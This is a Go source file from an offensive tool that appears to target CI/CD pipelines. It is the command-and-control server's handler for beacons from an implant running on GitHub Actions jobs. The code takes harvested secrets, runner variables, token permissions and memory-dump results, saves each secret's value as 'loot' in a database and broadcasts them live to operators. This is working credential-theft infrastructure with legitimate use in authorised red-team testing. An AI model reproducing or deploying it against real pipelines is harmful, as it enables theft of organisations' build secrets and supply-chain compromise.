// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package kitchen

import (
	"fmt"
	"log/slog"
	"time"

	"github.com/boostsecurityio/smokedmeat/internal/kitchen/db"
	"github.com/boostsecurityio/smokedmeat/internal/models"
)

func (h *Handler) handleResidentJobBeacon(beacon BeaconRequest, express ExpressBeaconRequest) {
	observed := express.ResidentJob
	if observed == nil {
		return
	}
	if observed.AttributionConfidence == "" {
		observed.AttributionConfidence = models.ResidentJobConfidenceUnknown
	}
	if observed.HarvestProfile == "" {
		observed.HarvestProfile = models.ResidentJobHarvestProfileLite
	}
	slog.Info("resident job beacon",
		"agent_id", beacon.AgentID,
		"event", observed.Event,
		"confidence", observed.AttributionConfidence,
		"memdump_attempted", express.MemdumpAttempted,
		"memdump_error", express.MemdumpError,
		"memdump_pid", express.MemdumpPID,
		"memdump_count", express.MemdumpCount,
		"memdump_regions", express.MemdumpRegions,
		"memdump_bytes", express.MemdumpBytes,
		"memdump_read_errors", express.MemdumpReadErrors,
		"memdump_scan_attempts", express.MemdumpScanAttempts,
		"memdump_process_targets", express.MemdumpProcessTargets)
	now := time.Now()
	h.updateResidentCallbackMetadata(beacon.CallbackID, *observed, now)
	h.recordResidentJobHistory(beacon, *observed, now)

	if observed.Event != models.ResidentJobEventHarvested {
		return
	}

	secrets := extractSecrets(express.Env, express.RunnerSecrets)
	tokenPerms := extractTokenPermissions(express.RunnerSecrets)
	vars := extractVars(express.RunnerVars)
	if len(secrets) == 0 && len(vars) == 0 {
		return
	}

	if h.database != nil && len(secrets) > 0 {
		lootRepo := db.NewLootRepository(h.database)
		for _, secret := range secrets {
			lootRow := &db.LootRow{
				ID:                    fmt.Sprintf("%s:%s:%s:%s", beacon.SessionID, beacon.AgentID, observed.JobKey, secret.Name),
				SessionID:             beacon.SessionID,
				AgentID:               beacon.AgentID,
				Hostname:              beacon.Hostname,
				Timestamp:             now,
				Origin:                db.LootOriginResident,
				Name:                  secret.Name,
				Value:                 secret.Value,
				Type:                  secret.Type,
				Source:                secret.Source,
				HighValue:             secret.HighValue,
				Repository:            observed.Repository,
				Workflow:              observed.Workflow,
				Job:                   observed.Job,
				TokenPermissions:      tokenPerms,
				ResidentJobKey:        observed.JobKey,
				RunID:                 observed.RunID,
				RunAttempt:            observed.RunAttempt,
				AttributionConfidence: observed.AttributionConfidence,
				HarvestProfile:        observed.HarvestProfile,
				SignalSource:          observed.SignalSource,
			}
			if err := lootRepo.Upsert(lootRow); err != nil {
				slog.Warn("failed to persist resident job loot", "error", err, "name", secret.Name)
			}
		}
	}

	if h.operators != nil {
		h.operators.BroadcastExpressData(ExpressDataPayload{
			AgentID:          beacon.AgentID,
			SessionID:        beacon.SessionID,
			Hostname:         beacon.Hostname,
			Secrets:          secrets,
			Vars:             vars,
			TokenPermissions: tokenPerms,
			Timestamp:        now,
			Repository:       observed.Repository,
			Workflow:         observed.Workflow,
			Job:              observed.Job,
			CallbackID:       beacon.CallbackID,
			CallbackMode:     beacon.CallbackMode,
			ResidentJob:      observed,
		})
	}
}

func (h *Handler) updateResidentCallbackMetadata(callbackID string, observed models.ResidentJobObservation, now time.Time) {
	if callbackID == "" {
		return
	}
	metadata := map[string]string{
		"resident_watch_status":    observed.Event,
		"resident_signal_source":   observed.SignalSource,
		"resident_confidence":      observed.AttributionConfidence,
		"resident_harvest_profile": observed.HarvestProfile,
		"resident_last_repository": observed.Repository,
		"resident_last_workflow":   observed.Workflow,
		"resident_last_job":        observed.Job,
		"resident_last_run_id":     observed.RunID,
		"resident_last_seen_at":    now.UTC().Format(time.RFC3339),
	}
	if !observed.ObservedAt.IsZero() {
		metadata["resident_last_observed_at"] = observed.ObservedAt.UTC().Format(time.RFC3339)
	}
	if !observed.HarvestedAt.IsZero() {
		metadata["resident_last_harvested_at"] = observed.HarvestedAt.UTC().Format(time.RFC3339)
	}
	if observed.Error != "" {
		metadata["resident_last_error"] = observed.Error
	}
	stager := h.stagerStore.UpdateMetadata(callbackID, metadata)
	h.persistStager(stager)
}

func (h *Handler) recordResidentJobHistory(beacon BeaconRequest, observed models.ResidentJobObservation, now time.Time) {
	eventType := residentHistoryEventType(observed.Event)
	row := &db.HistoryRow{
		ID:                    fmt.Sprintf("hist_%d_rjh", now.UnixNano()),
		Type:                  eventType,
		Timestamp:             now,
		SessionID:             beacon.SessionID,
		Target:                observed.JobKey,
		TargetType:            "resident_job",
		Repository:            observed.Repository,
		StagerID:              beacon.CallbackID,
		Outcome:               observed.Event,
		ErrorDetail:           observed.Error,
		AgentID:               beacon.AgentID,
		Workflow:              observed.Workflow,
		Job:                   observed.Job,
		RunID:                 observed.RunID,
		AttributionConfidence: observed.AttributionConfidence,
		HarvestProfile:        observed.HarvestProfile,
		SignalSource:          observed.SignalSource,
	}
	if h.database != nil {
		repo := db.NewHistoryRepository(h.database)
		if err := repo.Insert(row); err != nil {
			slog.Warn("failed to persist resident job history", "error", err)
		}
	}
	if h.operators != nil {
		h.operators.BroadcastHistory(HistoryPayload{
			ID:                    row.ID,
			Type:                  string(row.Type),
			Timestamp:             row.Timestamp,
			SessionID:             row.SessionID,
			Target:                row.Target,
			TargetType:            row.TargetType,
			Repository:            row.Repository,
			StagerID:              row.StagerID,
			Outcome:               row.Outcome,
			ErrorDetail:           row.ErrorDetail,
			AgentID:               row.AgentID,
			Workflow:              row.Workflow,
			Job:                   row.Job,
			RunID:                 row.RunID,
			AttributionConfidence: row.AttributionConfidence,
			HarvestProfile:        row.HarvestProfile,
			SignalSource:          row.SignalSource,
		})
	}
}

func residentHistoryEventType(event string) db.HistoryEventType {
	switch event {
	case models.ResidentJobEventHarvested:
		return db.HistoryResidentHarvested
	case models.ResidentJobEventHarvestFailed:
		return db.HistoryResidentFailed
	default:
		return db.HistoryResidentObserved
	}
}
